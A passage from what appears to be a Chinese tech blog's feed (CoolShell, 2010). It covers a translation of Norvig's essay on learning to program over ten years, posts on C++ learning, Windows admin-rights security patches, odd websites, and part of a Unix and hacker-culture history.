<p>这里有篇文章叫《<a href="http://norvig.com/21-days.html" target="_blank"><strong>Teach Yourself Programming in Ten Years</strong></a>》，网上有人翻译了一下，不过原文已被更新了，我把网上的译文转载并更新如下：</p>
<p><span id="more-2250"></span></p>
<h3 style="text-align: center;"></h3>
<h3 style="text-align: center;">用十年来学编程<br>
Peter Norvig</h3>
<div></div>
<h4>为什么每个人都急不可耐？</h4>
<div>走进任何一家书店，你会看见《Teach Yourself Java in 7 Days》（7天Java无师自通）的旁边是一长排看不到尽头的类似书籍，它们要教会你Visual Basic、Windows、Internet等等，而只需要几天甚至几小时。我在<a href="https://www.amazon.com/" target="_blank">Amazon.com</a>上进行了如下<a href="https://www.amazon.com/exec/obidos/tg/browse/-/468558/104-5938873-6579160">搜索</a>：</div>
<div></div>
<div>
<a href="https://www.amazon.com/exec/obidos/search-handle-url/ix=books&amp;rank=%2Bfeaturedrank&amp;fqp=power%01pubdate%3A%20after%201992%20and%20title%3A%20days%20and%0D%20%28title%3A%20learn%20or%20title%3A%20teach%20yourself%29&amp;sz=25&amp;pg=1/ref=s_b_np" target="_blank">pubdate: after 1992 and title: days and (title: learn or title: teach yourself)<br>
</a> (出版日期：1992年后 and 书名：天 and （书名：学会 or 书名：无师自通）)</div>
<div></div>
<div>我一共得到了248个搜索结果。前面的78个是计算机书籍（第79个是《<a href="https://www.amazon.com/exec/obidos/ASIN/0781802245/" target="_blank">Learn Bengali in 30 days</a>》，30天学会孟加拉语）。我把关键词“days”换成“<a href="https://www.amazon.com/exec/obidos/search-handle-url/ix=books&amp;rank=%2Bfeaturedrank&amp;fqp=power%01pubdate%3A%20after%201992%20and%20title%3A%20hours%20and%0D%20%28title%3A%20learn%20or%20title%3A%20teach%20yourself%29&amp;sz=25&amp;pg=3/ref=s_b_np" target="_blank">hours</a>”，得到了非常相似的结果：这次有253本书，头77本是计算机书籍，第78本是《<a href="https://www.amazon.com/exec/obidos/ASIN/0028638999/" target="_blank">Teach Yourself Grammar and Style in 24 Hours</a>》（24小时学会文法和文体）。头200本书中，有96%是计算机书籍。</div>
<div></div>
<div>结论是，要么是人们非常急于学会计算机，要么就是不知道为什么计算机惊人地简单，比任何东西都容易学会。没有一本书是要在几天里教会人们欣赏贝多芬或者量子物理学，甚至怎样给狗打扮。在《<em><a href="http://www.ccs.neu.edu/home/matthias/HtDP2e/index.html">How to Design Programs</a></em>》这本书里说“<em>Bad programming is easy. Idiots can learn it in 21 days, even if they are dummies.” </em>（坏的程序是很容易的，就算他们是笨蛋白痴都可以在21天内学会。）</div>
<div></div>
<div>让我们来分析一下像《<a href="https://www.amazon.com/Learn-C-Three-Days-Rachele/dp/1556227078" target="_self">Learn C++ in Three Days</a>》（3天学会C++）这样的题目到底是什么意思：</div>
<ul>
<li>
<strong>学会</strong>：在3天时间里，你不够时间写一些有意义的程序，并从它们的失败与成功中学习。你不够时间跟一些有经验的程序员一起工作，你不会知道在C++那样的环境中是什么滋味。简而言之，没有足够的时间让你学到很多东西。所以这些书谈论的只是表面上的精通，而非深入的理解。如Alexander Pope（英国诗人、作家，1688-1744）所言，<strong><span style="color: #800080;">一知半解是危险的（a little learning is a dangerous thing）</span></strong>
</li>
<li>
<strong>C++</strong>：在3天时间里你可以学会C++的语法（如果你已经会一门类似的语言），但你无法学到多少如何运用这些语法。简而言之，如果你是，比如说一个Basic程序员，你可以学会用C++语法写出Basic风格的程序，但你学不到C++真正的优点（和缺点）。那关键在哪里？Alan Perlis（ACM第一任主席，图灵奖得主，1922-1990）曾经说过：“<strong><span style="color: #800080;">如果一门语言不能影响你对编程的想法，那它就不值得去学</span></strong>”。另一种观点是，有时候你不得不学一点C++（更可能是javascript和Flash Flex之类）的皮毛，因为你需要接触现有的工具，用来完成特定的任务。但此时你不是在学习如何编程，你是在学习如何完成任务。</li>
<li>
<strong>3天</strong>：不幸的是，这是不够的，正如下一节所言。</li>
</ul>
<h4>10年学编程</h4>
<div>一些研究者（<a href="https://www.amazon.com/exec/obidos/ASIN/034531509X/">Bloom (1985)</a>, <a href="http://norvig.com/21-days.html#bh">Bryan &amp; Harter (1899)</a>, <a href="https://www.amazon.com/exec/obidos/ASIN/0805803092">Hayes (1989)</a>, <a href="http://norvig.com/21-days.html#sc">Simmon &amp; Chase (1973)</a>）的研究表明，在许多领域，都需要大约10 年时间才能培养出专业技能，包括国际象棋、作曲、绘画、钢琴、游泳、网球，以及神经心理学和拓扑学的研究。似乎并不存在真正的捷径：即使是莫扎特，他4 岁就显露出音乐天才，在他写出世界级的音乐之前仍然用了超过13年时间。再看另一种音乐类型的披头士，他们似乎是在1964年的Ed Sullivan节目中突然冒头的。但其实他们从1957年就开始表演了，即使他们很早就显示出了巨大的吸引力，他们第一次真正的成功——Sgt. Peppers——也要到1967年才发行。<a href="https://www.amazon.com/Outliers-Story-Success-Malcolm-Gladwell/dp/0316017922">Malcolm Gladwell</a> 研究报告称，把在伯林音乐学院学生一个班的学生按水平分成高中低，然后问他们对音乐练习花了多少工夫：</div>
<blockquote><p>在这三个小组中的每一个人基本上都是从相同的时间开始练习的（在五岁的时候）。在开始的几年里，每个人都是每周练习2-3个小时。但是在八岁的时候，练习的强度开始显现差异。在这个班中水平最牛的人开始比别人练习得更多——在九岁的时候每周练习6个小时，十二岁的时候，每周8个小时，十四岁的时候每周16个小时，并在成长过程中练习得越来越多，到20岁的时候，其每周练习可超过30个小时。到了20岁，这些优秀者在其生命中练习音乐总共超过 10,000 小时。与之对比，其它人只平均有8,000小时，而未来只能留校当老师的人仅仅是4,000 小时。</p></blockquote>
<div>所以，这也许需要10,000 小时，并不是十年，但这是一个magic number。Samuel Johnson（英国诗人）认为10 年还是不够的：“<strong><span style="color: #800080;">任何领域的卓越成就都只能通过一生的努力来获得；稍低一点的代价也换不来。</span></strong>”（Excellence in any department can be attained only by the labor of a lifetime; it is not to be purchased at a lesser price.） 乔叟（Chaucer，英国诗人，1340-1400）也抱怨说：“<strong><span style="color: #800080;">生命如此短暂，掌握技艺却要如此长久。</span></strong>”（the lyf so short, the craft so long to lerne.）</div>
<div></div>
<div>下面是我在编程这个行当里获得成功的处方：</div>
<ul>
<li>对编程感兴趣，因为乐趣而去编程。确定始终都能保持足够的乐趣，以致你能够将10年时间投入其中。</li>
<li>跟其他程序员交谈；阅读其他程序。这比任何书籍或训练课程都更重要。</li>
<li>编程。最好的学习是<a href="http://www.engines4ed.org/hyperbook/nodes/NODE-120-pg.html" target="_blank">从实践中学习</a>。用更加技术性的语言来讲，“个体在特定领域最高水平的表现不是作为长期的经验的结果而自动获得的，但即使是非常富有经验的个体也可以通过刻意的努力而提高其表现水平。”（<a href="http://www2.umassd.edu/swpi/DesignInCS/expertise.html" target="_blank">p. 366</a>），而且“最有效的学习要求为特定个体制定适当难度的任务，有意义的反馈，以及重复及改正错误的机会。”（p. 20-21）《<a href="https://www.amazon.com/exec/obidos/ASIN/0521357349" target="_blank">Cognition in Practice: Mind, Mathematics, and Culture in Everyday Life</a>》（在实践中认知：心智、数学和日常生活的文化）是关于这个观点的一本有趣的参考书。</li>
<li>如果你愿意，在大学里花上4年时间（或者再花几年读研究生）。这能让你获得一些工作的入门资格，还能让你对此领域有更深入的理解，但如果你不喜欢进学校，（作出一点牺牲）你在工作中也同样能获得类似的经验。在任何情况下，单从书本上学习都是不够的。“计算机科学的教育不会让任何人成为内行的程序员，正如研究画笔和颜料不会让任何人成为内行的画家”, Eric Raymond，《The New Hacker’s Dictionary》（新黑客字典）的作者如是说。我曾经雇用过的最优秀的程序员之一仅有高中学历；但他创造出了许多伟大的软件（<a href="http://www.xemacs.org/" target="_blank">XEmacs</a>, <a href="https://www.mozilla.org/" target="_blank">Mozilla</a>），甚至有讨论他本人的<a href="https://groups.google.com/groups?q=alt.fan.jwz&amp;meta=site%3Dgroups" target="_blank">新闻组</a>，而且股票期权让他达到我无法企及的<a href="https://en.wikipedia.org/wiki/DNA_Lounge" target="_blank">富有程度</a>（译注：指Jamie Zawinski，Xemacs和Netscape的作者）。</li>
<li>跟别的程序员一起完成项目。在一些项目中成为最好的程序员；在其他一些项目中当最差的一个。当你是最好的程序员时，你要测试自己领导项目的能力，并通过你的洞见鼓舞其他人。当你是最差的时候，你学习高手们在做些什么，以及他们不喜欢做什么（因为他们让你帮他们做那些事）。</li>
<li>接手别的程序员完成项目。用心理解别人编写的程序。看看在没有最初的程序员在场的时候理解和修改程序需要些什么。想一想怎样设计你的程序才能让别人接手维护你的程序时更容易一些。</li>
<li>学会至少半打编程语言。包括一门支持类抽象（class abstraction）的语言（如Java或C++），一门支持函数抽象（functional abstraction）的语言（如Lisp或ML），一门支持句法抽象（syntactic abstraction）的语言（如Lisp），一门支持说明性规约（declarative specification）的语言（如Prolog或C++模版），一门支持协程（coroutine）的语言（如Icon或Scheme），以及一门支持并行处理（parallelism）的语言（如Sisal）。</li>
<li>记住在“计算机科学”这个词组里包含“计算机”这个词。了解你的计算机执行一条指令要多长时间，从内存中取一个word要多长时间（包括缓存命中和未命中的情况），从磁盘上读取连续的数据要多长时间，定位到磁盘上的新位置又要多长时间。（<a href="http://norvig.com/21-days.html#answers" target="_blank">答案在这里</a>）</li>
<li>尝试参与到一项语言标准化工作中。可以是ANSI C++委员会，也可以是决定自己团队的编码风格到底采用2个空格的缩进还是4个。不论是哪一种，你都可以学到在这门语言中到底人们喜欢些什么，他们有多喜欢，甚至有可能稍微了解为什么他们会有这样的感觉。</li>
<li>拥有尽快从语言标准化工作中抽身的良好判断力。</li>
</ul>
<p>抱着这些想法，我很怀疑从书上到底能学到多少东西。在我第一个孩子出生前，我读完了所有“怎样……”的书，却仍然感到自己是个茫无头绪的新手。30个月后，我第二个孩子出生的时候，我重新拿起那些书来复习了吗？不。相反，我依靠我自己的经验，结果比专家写的几千页东西更有用更靠得住。</p>
<p>Fred Brooks在他的短文《<a href="https://en.wikipedia.org/wiki/No_Silver_Bullet" target="_blank">No Silver Bullets</a>》（没有银弹）中确立了如何发现杰出的软件设计者的三步规划：</p>
<ul>
<li>尽早系统地识别出最好的设计者群体。</li>
<li>指派一个事业上的导师负责有潜质的对象的发展，小心地帮他保持职业生涯的履历。</li>
<li>让成长中的设计师们有机会互相影响，互相激励。</li>
</ul>
<p>这实际上是假定了有些人本身就具有成为杰出设计师的必要潜质；要做的只是引导他们前进。<a href="http://www-pu.informatik.uni-tuebingen.de/users/klaeren/epigrams.html" target="_blank">Alan Perlis</a>说得更简洁：“每个人都可以被教授如何雕塑；而对米开朗基罗来说，能教给他的倒是怎样能够不去雕塑。杰出的程序员也一样”。</p>
<p>所以尽管去买那些Java书；你很可能会从中找到些用处。但你的生活，或者你作为程序员的真正的专业技术，并不会因此在24小时、24天甚至24个月内发生真正的变化。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2010-03-30T08:27:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/2250.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Emacs配色在线生成器 ]]></title>
<link>https://coolshell.cn/articles/2271.html</link>
<content><![CDATA[ 
<p><a href="http://alexpogosyan.com/color-theme-creator/">http://alexpogosyan.com/color-theme-creator/</a></p>
<p>点击“Generate config file”，你可以看到生成的Emacs配色配置。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p></p>
 ]]></content>
<pubDate>2010-03-31T09:15:19+08:00</pubDate>
<guid>https://coolshell.cn/articles/2271.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 又一个Javascript试验田 ]]></title>
<link>https://coolshell.cn/articles/2276.html</link>
<content><![CDATA[ 
<p>以前本站发布过一篇《<a href="https://coolshell.cn/articles/1932.html" target="_blank">哥是玩程序的</a>》文章向大家展示了用Javascript干的些怪异的事。看来，这样的人并不在少数，这不，我又发现了一个，这回这个好像更有技术含量一些，下面是其试验程序的列表：</p>
<p style="text-align: center;"><a href="http://www.andrew-hoyer.com/experiments">http://www.andrew-hoyer.com/experiments</a></p>
<table>
<tbody>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/sudoku"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/sudoku">Simple Sudoku Solver</a> 这是一个“数独游戏”，其在你游戏的过程中可以在空格处提示你可能的数字。
<p class="exp_date">February 2010</p>
</td>
</tr>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/cloth"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/cloth">Cloth Simulation</a> 这是一个极端的布料仿真程序。使用鼠标拖曳，按着g键拖曳可以把布悬挂起来。
<p class="exp_date">August 2009</p>
</td>
</tr>
</tbody>
</table>
<p><span id="more-2276"></span></p>
<table>
<tbody>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/numbers"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/numbers">Numbers to Words</a> 这是一个把阿拉伯数字变成英文说明的演示。
<p class="exp_date">June 2009</p>
</td>
</tr>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/particle_system"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/particle_system">N-Bodies Particle System</a> 可以模拟物理学上的原子核与电子圆周运动的的样子。
<p class="exp_date">April 2009</p>
</td>
</tr>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/quantum_cryptography"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/quantum_cryptography">Quantum Cryptography</a> 一篇文章介绍了什么叫“量子加密”。
<p class="exp_date">March 2009</p>
</td>
</tr>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/dripsessions"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/dripsessions">Drip Sessions</a> 一个流淌的效果。
<p class="exp_date">February 2009</p>
</td>
</tr>
<tr>
<td><a href="http://www.andrew-hoyer.com/experiments/robotarm"><br>
<img alt="image placeholder" ><br>
</a></td>
<td>
<a class="important" href="http://www.andrew-hoyer.com/experiments/robotarm">Robotic Arm</a> 一个机械手臂的演示程序。
<p class="exp_date">December 2008</p>
</td>
</tr>
</tbody>
</table>
<p>（全文完）</p>
 ]]></content>
<pubDate>2010-03-31T12:41:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/2276.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++ 程序员自信心曲线图 ]]></title>
<link>https://coolshell.cn/articles/2287.html</link>
<content><![CDATA[ 
<p>学习C++很长时间了，也看过很多程序员学习C++的历程。总体来说，C++是一个“双刃剑”式的语言，只有那些熟悉他的人才能把C++这门语言用好。Linus曾说过：“<strong>C++是一门很<a href="https://coolshell.cn/articles/1724.html" target="_blank">恐怖的语言</a>，而比它更恐怖的是很多不合格的程序员在使用着它</strong>”。是的，C++并不是一门速成的语言，其是一门需要长时间磨练和学习的语言，那些说自己熟悉C++语言的程序只能算是轻浮的。详见<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank">“21天教你学会C++ ”</a>。</p>
<p>下面是一个C++程序员在学习过程序中的一个自信心曲线图：</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/03/c++.png"><img alt="image placeholder" ></a> </p>
<p>程序员在一开始学习C++的时候，用C++的语法写C觉得很牛，也会觉得自己很快掌握了C++语言，对一切都充满了信心。他们告诉你他们懂C++，其它他们错误，但我们不能说他们在撒谎，因为人总是不知道自己不知道什么。此后，当他们在C++的学习历程中，发现了很多很多稀奇古怪的东西，还有很多相当底层和复杂的东西，他们的将会变得很受挫，很沮丧，还始变得怀疑起，自信心开始下降，甚至有时候他们靠人品来编程。只到有一天，开始开窃，觉得C++的世界不能乱来，需要一定的规则，一定的方法，于是通过大量的错误不停地总结和反省，最终自信心又会被建立起来，<a href="https://coolshell.cn/articles/2250.html" target="_blank">经历多年的历练后</a>，才能恢复自信。</p>
<p>对于大多数的自称自己熟悉C++的程序员来说，基本上来说他们都是用C++的语法来写C。</p>
 ]]></content>
<pubDate>2010-04-01T09:02:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/2287.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Google居然在阻止人们自杀？ ]]></title>
<link>https://coolshell.cn/articles/2296.html</link>
<content><![CDATA[ 
<p>中文的Google会不会出onebox来劝阻人们翻墙？</p>
<p><span style="font-family: arial,helvetica,sans-serif;"> </span><span style="font-family: arial,helvetica,sans-serif;"><a href="https://www.google.com/search?q=ways+to+commit+suicide" target="_blank">suicide prevention onebox</a></span></p>
<p><a href="https://www.google.com/search?q=poison+control" target="_blank"><span style="font-family: arial,helvetica,sans-serif;">poison control onebox</span></a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/04/googleOnebox.png"><img alt="image placeholder" ></a></p>
 ]]></content>
<pubDate>2010-04-01T12:57:29+08:00</pubDate>
<guid>https://coolshell.cn/articles/2296.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 微软的安全补丁分析 ]]></title>
<link>https://coolshell.cn/articles/2305.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >截止至2009年底，大约有90%的微软安全补丁是把管理员权限给disable了。根据 <a href="https://www.beyondtrust.com/">BeyondTrust</a>的报告，到今年3月分，Windows 7 有57%的安全补丁是以移除管理员权限作为解决方法的，相比较而言，Windows 2000 是 53%，Windows XP 是 62%，Windows Server 2003 是 55%，Windows Vista 是 54% 以及 Windows Server 2008 是 53%，而最牛的要算是 —— 100% 的 Microsoft Office 和 94%  Internet Explorer （其中100% 的 IE8 ）的安全补丁是移除管理员权限。</p>
<p>这对于某些公司的IT部门来说是个好消息，因为这些公司的IT部门通常是不会让公司的员工有本机的管理员权限的，根据微软大量的安全补丁是移除某些管理员权限的这一特性，这意味着对于本机只有一般用户权限IT管理，将会防住很大一部份的恶意攻击。</p>
<p>Paul Cooke, Windows Client Enterprise Security主管说：“我们相信，如果你只是用一般用户来操作Windows的话，这会是一种很好的方式”。而这一提法，相对于Unix的尽可能的不用root用户操作系统这一观点，整整落后了几十年，Windows的用户很习惯于在Administrator下操作系统，这样，一旦中招，任何程序都以系统管理员的权限运行，所以结果也是毁灭性的。这样操作电脑的方式对于Unix的用户来说简直是不可想像的，因为在Unix下，99%的情况下，操作者都不会使用管理员的账号。</p>
<p>还记得以前和朋友的一段对话：</p>
<p><span id="more-2305"></span></p>
<p style="padding-left: 30px;">朋友：“为什么Windows下很容易中病毒，Unix/Linux下却不常见？杀毒软件在Windows下是必备的，但还是很容易中招，而Unix/Linux却可以祼奔。”</p>
<p style="padding-left: 30px;">陈皓：“那是因为大家都用Windows的Administrator用户操作电脑，而且文件系统都没有权限设置。不像Unix/Linux，没人总是用root操作电脑，而且，所有的文件和目限都有权限。所以，Windows下，一中病毒，病毒就会以管理员的权限运行，不但破坏你的系统甚至干掉你的杀毒软件。而Unix/Linux下，就算中毒，干掉的也是当前用户下的文件，对于系统文件和系统进程来说，不会有任何问题。”</p>
<p style="padding-left: 30px;">朋友：“那么在Windows下，如何和Unix/Liunx一样使用？”</p>
<p style="padding-left: 30px;">陈皓：“首先，尽量不要使用Adminstrator用户，使用User用户操作电脑。并且把文件系统格式化成NTFS，这样才能设置上权限。把C盘的根目录，%Windows%以及%System%目录，注册表的关键位置（服务、启动等），都设置上只有Administrator可写，User只读。这样一来，就算是中毒，病毒最多改写当关用户文件，其根本无法操作C盘根目录和Windows%以及%System%目录以及注册表的关键位置，还有IE的插件等（这些地方都是病毒最爱去的地方），中毒后不会对系统造成伤害。在这种情况下，你就算没有杀毒软件祼奔也没有问题”</p>
<p style="padding-left: 30px;">朋友：“嗯，听起来不错。不过这样整是不是太麻烦了，特别是要装一些软件什么的。”</p>
<p style="padding-left: 30px;">陈皓：“是的，没错。按道理来说，各个用户的软件应该是装在其用户的目录和环境下，而不应该装在系统的目录下，Unix/Liunx就是这么做的，但是Windows并没有提供这样的方式，很多软件都要去Adminstrator下安装，所以，在系统上装上一些恶意插件，流氓软件也就很正常了。没办法，这就是Windows和Unix/Liunx的差别了，Windows出生的时候就是单用户的，Unix/Liunx则是多用户的，这是Windows先天设计的缺陷，所以，今天这样的局面也是理所当然的。”</p>
<p>上面的这段对话，也许有助于你了解Windows，安全等方面的东西。下面，让我们再来用一组数据结束本文。</p>
<p>总体来说，去年一年中64%的所有的微软安全补丁把管理员权限给移除了。如果你只考虑Critical级别的安全补丁，那么有点到80%补丁是移除管理员权限，如果只考虑远程攻击方面的，那么这个比率是84% 。相关的报道请查看如下文章：</p>
<li>
<a href="https://www.beyondtrust.com/downloads/whitepapers/documents/wp039_BeyondTrust_2009_Microsoft_Vulnerability_Analysis.pdf">90% of Critical Microsoft Windows 7 Vulnerabilities are Mitigated by Eliminating Admin Rights</a> (beyondtrust.com)</li>
<li>
<a href="http://news.cnet.com/8301-27080_3-20001359-245.html">Report: Windows 7 holes eased by axing admin rights</a> (news.cnet.com)</li>
<p>（全文完）</p>
 ]]></content>
<pubDate>2010-04-06T08:42:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/2305.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 史上最糟糕的网站 ]]></title>
<link>https://coolshell.cn/articles/2313.html</link>
<content><![CDATA[ 
<p>下面罗列了一些可能是史上最糟糕的网站，当你打开这些网站的时候，请不要太过惊讶，你可以尝试着欣赏一下，不可否认，如果你使劲全力去欣赏，你还是可以找到一些亮点的。呵呵。</p>
<ol>
<li>
<a href="http://www.shufsd.org/" target="_blank">http://www.shufsd.org/</a>，这个网站让我想到了我97年在大学里开始学习HTML的时光，该网页的风格可能比当时我做的还要好一些，不过基本上是很类似的。</li>
<li>
<a href="http://www.havenworks.com/" target="_blank">http://www.havenworks.com/</a>，这个网站呢？先介绍这个网站主要是让你对后面的网站有个过渡，老实说，这个网站比起后面的来说，还算可以了。这个网站教会我们如何分类网页上的信息</li>
<li>
<a href="http://www.arngren.net/" target="_blank">http://www.arngren.net/</a>，这个网站教你如何在固定空间的网页上放置更多的信息。这好像是我们日常生活当中经常出现的问题，如何把更多的东西放进一个固定的箱子里，我们不停地调整着物品摆放的位置和顺序……</li>
<li>
<a href="http://www.team2stool.com/" target="_blank">http://www.team2stool.com/</a>，开始了，这个网站教会我们如何把图片无序地组织起来。</li>
<li>
<a href="http://yvettesbridalformal.com/index.htm" target="_blank">http://yvettesbridalformal.com/index.htm</a>，嗯，初看起来吓一大跳，这个网页教你如何制作一个惊悚的网页，不过往细里看，看久一会，你会发现，这个网页设计得很的印象派的风格，也许是一种艺术。</li>
<li>
<a href="http://www.dokimos.org/ajff/" target="_blank">http://www.dokimos.org/ajff/</a>，什么叫炫，这就叫炫，太炫了，眼睛就炫花了。打开这个网页的时候，要注意浏览器上边的提示条，耶稣真的很强大啊。</li>
<li>
<a href="http://www.belladesoto.us/" target="_blank">http://www.belladesoto.us/</a>，打开这个网页要小心啊，因为这个网页可能比BT下载还猛，据说可能会占用你半GB的带宽。小心啊。</li>
<li>
<a href="http://www.superbad.com/" target="_blank">http://www.superbad.com/</a>，这可能是史上最无厘头的网页了，不知道这个网站要干什么，找到可以点的地方点吧，打开一个网页，再点击其中的链接，又打开一个网页，不一会儿你就会在一层又一层的网页中迷路了，好在每次打开的网页都风格迥然，倒也不会觉得单一。</li>
</ol>
<p>你还知道一些BT的网站吗？欢迎和我们一样分享。</p>
 ]]></content>
<pubDate>2010-04-07T09:35:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/2313.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Unix传奇(下篇) ]]></title>
<link>https://coolshell.cn/articles/2324.html</link>
<content><![CDATA[ 
<div>
<p><span style="color: #888888;">【本文曾于2007年3月于</span><a href="http://blog.csdn.net/haoel" target="_blank"><span style="color: #0000ff;">我在CSDN上的BLOG</span></a><span style="color: #888888;">发布，现在我把其搬到酷壳来，一来是觉得这段历史相当传奇，值得大家再看看，二来也和我在酷壳上发布的一些文章相互链接。】</span></p>
<hr>
<p><a href="https://coolshell.cn/articles/2322.html" target="_blank"><strong>&lt;&lt;&lt;&lt;   Unix传奇（上篇）</strong></a></p>
</div>
<div></div>
<div>Unix是目前还在存活的操作系统的元老了，走过了40年的历程（参看《<a rel="bookmark" href="https://coolshell.cn/articles/1032.html" target="_blank">Unix 40年：Unix年鉴</a>》、《<a rel="bookmark" href="https://coolshell.cn/articles/1023.html">Unix 40年：昨天，今天和明天</a>》）。由它引发的思想变革，对当今计算机文化造成的深远影响。这是一段所有从事计算机行业人员尤其是软件开发人员需要了解的历史。Unix的传奇历史是整个计算机世界文化最具代表性的，它对整个计算机世界文化的影响也是最巨大，最深远的。他给人带来的不单单的对过去的回味，更为我们带来了计算机世界的新思潮。</div>
<div></div>
<div>
<p><strong><a href="https://coolshell.cn/articles/2324.html" target="_blank">下篇</a></strong></p>
<ul>
<li>Unix与黑客文化</li>
<li>Unix的历史教训</li>
<li>Unix 家族谱</li>
<li>Unix的特点</li>
<li>Unix的影响和哲学</li>
<li>Unix痛恨者手册</li>
</ul>
</div>
<p><span id="more-2324"></span></p>
<div>
<ul></ul>
<p><strong><a href="https://coolshell.cn/articles/2322.html" target="_blank">上篇</a></strong></p>
<ul>
<li>Unix起源</li>
<li>Unix分裂</li>
<li>Unix的法律纠纷</li>
<li>GNU开源组织</li>
<li>Linux横空出世</li>
<li>Linux今天的领袖</li>
</ul>
</div>
<h3>Unix与黑客文化</h3>
<p>黑客的文化和Unix的商业化存在着必然的联系。自从Unix出现，黑客文化就与之而来。</p>
<p>1993初，一个悲观的观察家撰文指出，已经有理由认为Unix的传奇故事连同他带有黑客文明将一同破产。许多人预测，从那时起Unix将在六月内死亡。他们很清楚，十年的Unix商业化，使自由跨平台的Unix梦以失败告终。Unix允诺的跨平台可移植性，在一打大公司专有的Unix版本之间不停地斗嘴中丢失，一个完美的操作系统最终沦为多种版本的一团乱麻，这应该说是人类文明史上的一个重大悲剧。</p>
<p>在专有软件社会中，只有像微软一样的“集权制，大教堂”生产方式才能成功。那个时代的人悲观地相信，技术世界的个人英雄主义时代已经结束，软件工业和发展中的互联网络将逐渐地由像微软一样的巨型企业支配，再也没有“佐罗”，世界是恺撒大帝的世界，计算机文明将进入黑暗的帝国时代。黑客已经死了，自由不付存在。</p>
<p>自从Unix出现以来，第一代的Unix黑客似乎垂垂老矣，衣食不饱( Berkeley计算机科学研究组在1994丢失了自己基金)。这是一个抑压的时代。专有的商业Unix的结果证明那么沉重、那么盲目、那么不适当，以致微软能够用那次等技术的Windows抢走他们生存的空间，拿走他们的干粮。黑客世界的残余力量被逼到了世界上的角落里，苟延残喘。</p>
<p>就在黑客文化日渐衰落之时，美国新闻周刊的资深记者Steven Levy完成了著名的《黑客列传》一书，书中着力介绍了一个人物：Richard M. Stallman的故事，他是麻省理工学院（MIT）人工智能实验室领袖人物，坚决反对实验室的研究成果商业化。他是商业软件社会中坚强的一员，决不随波逐流，建立了全新的黑客文化。</p>
<p>Richard M. Stallman（他的登陆名RMS更为人熟知）早在1970年代晚期就已经证明他是当时最有能力的程序员之一。Emacs编辑器就是他众多发明中的一项。RMS的目标是将后1980的松散黑客社群变成一台有组织的社会化机器以达到一个单纯的革命目标。也许他未意识到，他的言行与当年卡尔·马克思号召产业无产阶级反抗工作的努力如出一辙。RMS宣言引发的争论至今仍存于黑客文化中。他的纲要远不止于维护一个代码库，已经暗含了废除软件知识产权主张的精髓。RMS通过“自由软件（free software）”让黑客文化更加有自我意识。当然，这个充满魅力又具争议的人物本身已经成为了一个黑客文化英雄。</p>
<p><em>只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。 </em><em>——</em>《<em>The Art of Unix Programming</em>》<em> </em></p>
<p>RMS让世界上所有的人都知道，入侵电脑系统只是低级不入流的黑客干的事，真正的黑客，是为了自由，为了软件的自由，为了挑战计算机世界中的霸权主义而斗争。他们不是街头小混混，他们更像是绿林好汉，更像是罗宾汉，更像是佐罗。就像渴望民主的人民同专制的政府斗争一样。RMS领导着许多的黑客通过互联网向专有软件发出宣战。</p>
<p>X Windows是首批由服务于全球各地不同组织的许多个人以团队形式开发的大规模开源项目之一。电子邮件使创意得以在这个群体中快速传播，问题由此得以快速解决，而开发者可以人尽其才。软件更新可以在数小时之内发送到位，使得每个节点在整个开发过程中步调一致。网络改变了软件的开发模式。</p>
<p>另一方面，RMS的理论体系有许多东西非常有争议，他的GPL被认为是一种“病毒式”的协议，BSD的fans和老牌Unix黑客们认为，他们编写Unix的年头都比GPL声明要长得多，GPL依然有太多的限制，而BSD协议则比GPL更加的自由。另一方面，RMS走向了另一个极端，他是完全反版权的，反商业化的。把软件产品从强制收费推向了强制免费、共享和开源，这也为他带来了许多许多的争议。</p>
<p>在RMS组织黑客闹革命的年代里，没有多少黑客认同于RMS的理论体系，更多的他们参与GNU只是为了体现那种在互联网上协同工作，令人激动的工作模式。自从GNU设立以来，争议不断，而黑客文化却从未有统一在他的理想体系之下。</p>
